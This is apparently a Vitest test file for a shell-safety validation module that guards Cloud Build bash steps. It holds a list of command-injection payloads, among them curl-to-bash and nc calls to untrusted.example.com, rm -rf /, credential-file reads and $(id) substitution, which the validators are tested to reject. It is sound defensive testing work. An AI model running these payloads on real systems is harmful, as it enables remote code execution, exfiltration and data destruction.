// @vitest-environment node
import { describe, it, expect } from "vitest";
import {
  isValidHostname,
  isValidGcpResourceName,
  containsShellMetacharacters,
  normalizeHostname,
  assertValidHostname,
  assertValidGcpResourceName,
  shellSingleQuote,
  isValidServiceAccountEmail,
  isValidProjectIdentifier,
  assertValidBucketPath,
} from "./shellSafety";

/**
 * Real command-injection payloads for the Cloud Build `bash -c` steps.
 * Every one of these must be rejected. If any starts passing, the RCE is back.
 */
const INJECTION_PAYLOADS = [
  'example.com --domains=x; curl https://untrusted.example.com/s.sh | bash; #',
  "example.com && rm -rf /",
  "example.com; cat /workspace/*.json",
  "example.com`whoami`",
  "example.com$(id)",
  "example.com | nc untrusted.example.com 4444",
  "example.com\nrm -rf /",
  "example.com'; echo pwned; '",
  'example.com"; echo pwned; "',
  "example.com --format='value(x)' --project=other-project",
  "$(curl https://untrusted.example.com)",
  "../../etc/passwd",
  "example.com > /workspace/overwrite",
  "example.com & sleep 100",
];

describe("isValidHostname", () => {
  it.each(INJECTION_PAYLOADS)("rejects injection payload %j", (payload) => {
    expect(isValidHostname(payload)).toBe(false);
  });

  it("accepts ordinary domains", () => {
    expect(isValidHostname("ai.yourcompany.com")).toBe(true);
    expect(isValidHostname("gemini.mycompany.com")).toBe(true);
    expect(isValidHostname("a.co")).toBe(true);
    expect(isValidHostname("my-app.sub.domain.example.com")).toBe(true);
    expect(isValidHostname("x1.example2.com")).toBe(true);
  });

  it("normalizes case, surrounding whitespace and a trailing FQDN dot", () => {
    expect(isValidHostname("  AI.YourCompany.COM  ")).toBe(true);
    expect(isValidHostname("example.com.")).toBe(true);
    expect(normalizeHostname("  AI.Example.COM.  ")).toBe("ai.example.com");
  });

  it("rejects structurally invalid hostnames", () => {
    expect(isValidHostname("")).toBe(false);
    expect(isValidHostname("nodot")).toBe(false); // single label
    expect(isValidHostname("-leading.example.com")).toBe(false);
    expect(isValidHostname("trailing-.example.com")).toBe(false);
    expect(isValidHostname("double..dot.com")).toBe(false);
    expect(isValidHostname(".leading.dot.com")).toBe(false);
    expect(isValidHostname("under_score.example.com")).toBe(false);
    expect(isValidHostname(`${"a".repeat(64)}.example.com`)).toBe(false); // label > 63
    expect(isValidHostname(`${"a".repeat(250)}.example.com`)).toBe(false); // total > 253
  });

  it("rejects non-string input without throwing", () => {
    expect(isValidHostname(null as unknown as string)).toBe(false);
    expect(isValidHostname(undefined as unknown as string)).toBe(false);
    expect(isValidHostname(123 as unknown as string)).toBe(false);
  });

  it("guarantees accepted values are free of shell metacharacters", () => {
    // This is the property the whole defense rests on.
    const accepted = [
      "ai.yourcompany.com",
      "a.co",
      "my-app.sub.domain.example.com",
    ];
    for (const value of accepted) {
      expect(isValidHostname(value)).toBe(true);
      expect(containsShellMetacharacters(value)).toBe(false);
    }
  });
});

describe("isValidGcpResourceName", () => {
  it.each(INJECTION_PAYLOADS)("rejects injection payload %j", (payload) => {
    expect(isValidGcpResourceName(payload)).toBe(false);
  });

  it("accepts ordinary resource names", () => {
    expect(isValidGcpResourceName("my-service")).toBe(true);
    expect(isValidGcpResourceName("svc1")).toBe(true);
    expect(isValidGcpResourceName("a")).toBe(true);
  });

  it("rejects names that violate GCP naming rules", () => {
    expect(isValidGcpResourceName("")).toBe(false);
    expect(isValidGcpResourceName("1leading-digit")).toBe(false);
    expect(isValidGcpResourceName("-leading-hyphen")).toBe(false);
    expect(isValidGcpResourceName("trailing-hyphen-")).toBe(false);
    expect(isValidGcpResourceName("Upper-Case")).toBe(false);
    expect(isValidGcpResourceName("under_score")).toBe(false);
    expect(isValidGcpResourceName("has space")).toBe(false);
    expect(isValidGcpResourceName("a".repeat(64))).toBe(false);
  });
});

describe("assert helpers", () => {
  it("returns the normalized value when input is valid", () => {
    expect(assertValidHostname("  AI.Example.COM  ")).toBe("ai.example.com");
    expect(assertValidGcpResourceName("  my-service  ")).toBe("my-service");
  });

  it("throws a message naming the offending field and value", () => {
    expect(() => assertValidHostname("bad;domain", "Custom domain")).toThrow(
      /Custom domain is not a valid domain name/,
    );
    expect(() => assertValidGcpResourceName("Bad Name", "Service name")).toThrow(
      /Service name is not a valid Google Cloud resource name/,
    );
  });

  it("blocks every injection payload at the assert layer too", () => {
    for (const payload of INJECTION_PAYLOADS) {
      expect(() => assertValidHostname(payload)).toThrow();
      expect(() => assertValidGcpResourceName(payload)).toThrow();
    }
  });
});

describe("shellSingleQuote", () => {
  it("neutralizes command substitution, variables and backticks", () => {
    expect(shellSingleQuote("$(id)")).toBe("'$(id)'");
    expect(shellSingleQuote("`id`")).toBe("'`id`'");
    expect(shellSingleQuote("$HOME")).toBe("'$HOME'");
    expect(shellSingleQuote("a; rm -rf /")).toBe("'a; rm -rf /'");
  });

  it("handles embedded single quotes with the '\\'' idiom", () => {
    expect(shellSingleQuote("a'b")).toBe("'a'\\''b'");
    expect(shellSingleQuote("'")).toBe("''\\'''");
  });

  it("handles empty and nullish input without producing bare text", () => {
    expect(shellSingleQuote("")).toBe("''");
    expect(shellSingleQuote(null as unknown as string)).toBe("''");
    expect(shellSingleQuote(undefined as unknown as string)).toBe("''");
  });
});

describe("assertValidServiceAccountEmail", () => {
  it("accepts user-managed and Google-managed service accounts", () => {
    expect(isValidServiceAccountEmail("my-sa@my-project.iam.gserviceaccount.com")).toBe(true);
    expect(isValidServiceAccountEmail("123456789012-compute@developer.gserviceaccount.com")).toBe(true);
    expect(isValidServiceAccountEmail("123456789012@cloudbuild.gserviceaccount.com")).toBe(true);
    expect(isValidServiceAccountEmail("service-1@gcp-sa-aiplatform.iam.gserviceaccount.com")).toBe(true);
  });

  it("rejects injection payloads and non-service-account addresses", () => {
    expect(isValidServiceAccountEmail("foo@bar$(curl https://untrusted.example.com|bash)")).toBe(false);
    expect(isValidServiceAccountEmail("a@b.com; rm -rf /")).toBe(false);
    expect(isValidServiceAccountEmail("user@example.com")).toBe(false);
    expect(isValidServiceAccountEmail("`id`@x.gserviceaccount.com")).toBe(false);
    expect(isValidServiceAccountEmail("")).toBe(false);
  });
});

describe("assertValidProjectIdentifier", () => {
  it("accepts both project IDs and numeric project numbers", () => {
    expect(isValidProjectIdentifier("my-project-123")).toBe(true);
    expect(isValidProjectIdentifier("123456789012")).toBe(true);
  });

  it("rejects injection payloads", () => {
    for (const p of INJECTION_PAYLOADS) expect(isValidProjectIdentifier(p)).toBe(false);
    expect(isValidProjectIdentifier("proj; rm -rf /")).toBe(false);
    expect(isValidProjectIdentifier("")).toBe(false);
  });
});

describe("assertValidBucketPath", () => {
  it("accepts bucket names, gs:// URIs and object paths", () => {
    expect(assertValidBucketPath("my-bucket")).toBe("my-bucket");
    expect(assertValidBucketPath("gs://my-bucket")).toBe("gs://my-bucket");
    expect(assertValidBucketPath("gs://my-bucket/config/entitlements.json")).toBe(
      "gs://my-bucket/config/entitlements.json",
    );
    expect(assertValidBucketPath("gs://my.domain.bucket/path")).toBe("gs://my.domain.bucket/path");
    expect(assertValidBucketPath("gs://my_bucket_name")).toBe("gs://my_bucket_name");
  });

  it("rejects uppercase bucket names, which GCS does not permit", () => {
    // Caught in review: the validator previously lowercased before testing,
    // so gs://My-Bucket passed and was then interpolated with its uppercase
    // intact -- shell-safe, but guaranteed to fail later inside gcloud.
    expect(() => assertValidBucketPath("gs://My-Bucket")).toThrow();
    expect(() => assertValidBucketPath("MY-BUCKET")).toThrow();
  });

  it("rejects injection in the bucket name or any path segment", () => {
    expect(() => assertValidBucketPath("gs://b; rm -rf /")).toThrow();
    expect(() => assertValidBucketPath("gs://bucket/$(id)")).toThrow();
    expect(() => assertValidBucketPath("gs://bucket/ok/`id`")).toThrow();
    expect(() => assertValidBucketPath("")).toThrow();
    expect(() => assertValidBucketPath("gs://")).toThrow();
  });
});
